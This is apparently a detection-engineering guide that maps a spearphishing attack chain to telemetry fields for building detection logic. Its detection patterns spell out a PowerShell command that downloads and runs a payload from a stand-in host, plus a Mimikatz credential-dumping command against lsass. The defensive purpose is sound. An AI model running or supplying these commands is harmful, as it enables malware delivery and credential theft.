1. **Identify Initial Email Delivery**  
   - Monitor for events indicating the receipt of an email with the subject "Important Update" and an attachment named "Invoice_2023.xlsx".  
   - Target fields:  
     - `srcNode.Name`: "Outlook"  
     - `dstNode.Name`: "Invoice_2023.xlsx"  
     - `dstNode.Type`: "File"  
     - Network indicators:  
       - `srcNode.Name`: "attacker@example.com"  
       - `dstNode.Dstaddress`: "192.0.2.1"  

2. **Detect Opening of Malicious Attachment**  
   - Look for events where the user opens the Excel attachment "Invoice_2023.xlsx".  
   - Target fields:  
     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\OfficeXX\\EXCEL.EXE" (replace XX with the version number)  
     - `dstNode.Image`: "C:\\path\\to\\Invoice_2023.xlsx"  
     - `relation`: "Process Create"  

3. **Capture PowerShell Command Execution**  
   - Identify events where a PowerShell command is executed to download and execute the payload.  
   - Target fields:  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `srcNode.Cmdline`: `Invoke-WebRequest -Uri "http://malicious.example.com/payload.exe" -OutFile "$env:TEMP\\payload.exe"; Start-Process "$env:TEMP\\payload.exe"`  
     - `relation`: "Process Create"  

4. **Monitor Payload Execution**  
   - Detect the execution of the downloaded payload (payload.exe) from the TEMP directory.  
   - Target fields:  
     - `srcNode.Image`: "C:\\Windows\\Temp\\payload.exe"  
     - `relation`: "Process Create"  
     - `timestamp`: Match the timing of the previous PowerShell command execution  

5. **Establish Command and Control Connection**  
   - Look for outbound network connections to the C2 server (203.0.113.5 on port 443).  
   - Target fields:  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `dstNode.Dstaddress`: "203.0.113.5"  
     - `dstNode.Port`: 443  
     - `relation`: "TCP Connect"  

6. **Detect Post-Exploitation Activities**  
   - Monitor for the execution of commands that may indicate post-exploitation activities, such as credential extraction using Mimikatz.  
   - Target fields:  
     - `srcNode.Image`: "C:\\path\\to\\mimikatz.exe"  
     - `srcNode.Cmdline`: `.\\mimikatz.exe "privilege::debug" "sekurlsa::minidump C:\\Windows\\System32\\lsass.dmp" "sekurlsa::process" "exit"`  
     - `relation`: "Process Create"  
     - `timestamp`: Match the timing of the previous payload execution  

By following these steps, detection engineers can create precise detection logic for the spearphishing attack scenario outlined in T1566.001.